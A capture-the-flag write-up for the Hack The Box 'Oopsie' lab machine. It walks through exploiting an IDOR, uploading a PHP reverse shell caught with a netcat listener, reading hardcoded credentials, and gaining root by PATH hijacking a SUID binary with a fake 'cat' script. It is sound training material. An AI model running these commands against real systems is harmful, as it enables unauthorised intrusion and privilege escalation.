# 🔓 Hack The Box — Oopsie Write-Up

> **Date Completed**: 03/07/2025  
> **Difficulty**: Easy  
> **Category**: PHP, Web, IDOR, SUID Exploitation  
> **Tags**: `IDOR`, `Reverse Shell`, `Privilege Escalation`, `SUID`, `PATH Hijacking`, `Apache`, `Custom App`, `Linux`

---

## 🏁 Overview

Oopsie is a beginner-friendly box that demonstrates how insecure object references and poor privilege separation can lead to full root access. The key vulnerabilities are an IDOR in a custom PHP app and a SUID binary that can be exploited via `PATH` hijacking.

---

## 🧪 Initial Recon

### 🔎 Nmap Scan

```bash
nmap -Pn -sV -T4 <target-ip>
Open Ports:

22/tcp - SSH

80/tcp - HTTP (Apache)

🌐 Web Recon
Visited the home page — no useful content.

Used Burp Suite and discovered /internal.

Found login page and Login as Guest option.

After enumerating parameters, discovered an IDOR vulnerability that exposed an admin account.

💥 Exploitation
🐚 Reverse Shell Upload
Uploaded php-reverse-shell.php via admin upload.

Started listener:

bash
Copy code
nc -lvnp 4444
Triggered shell:

perl
Copy code
http://<target-ip>/uploads/php-reverse-shell.php
🔄 Got a Shell, Then Upgraded
bash
Copy code
python3 -c 'import pty; pty.spawn("/bin/bash")'
🧑‍💻 Post-Exploitation
🔐 Found Credentials
Inspected PHP source code in /var/www/html/internal

Found hardcoded password

Used /etc/passwd to find valid usernames (e.g., robert)

Switched to robert using found credentials

🔼 Privilege Escalation
👥 Group Memberships
bash
Copy code
id
Output:

ini
Copy code
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
🔍 Found SUID Binary
bash
Copy code
find / -group bugtracker 2>/dev/null
Discovered: /usr/bin/bugtracker

🛠 PATH Hijacking Exploit
bash
Copy code
echo -e '#!/bin/bash\n/bin/bash' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH
bugtracker
✅ Got root shell because bugtracker was SUID and used cat without a full path.

🏁 Flags
User Flag: ✅

Root Flag: ✅

bash
Copy code
/bin/cat /root/root.txt
📚 Key Takeaways
IDOR vulnerabilities can be critical when combined with upload functionality.

SUID binaries are dangerous when calling system tools without full paths.

Always check group memberships and file permissions when escalating privileges.

Upload functions must sanitize and validate both file type and permissions.

📎 Resources
GTFOBins

Pentestmonkey PHP Reverse Shells

OWASP IDOR

📦 Files Collected
/var/www/html/internal/login.php (contained password)

/tmp/cat (malicious shell)

/usr/bin/bugtracker (vulnerable SUID binary
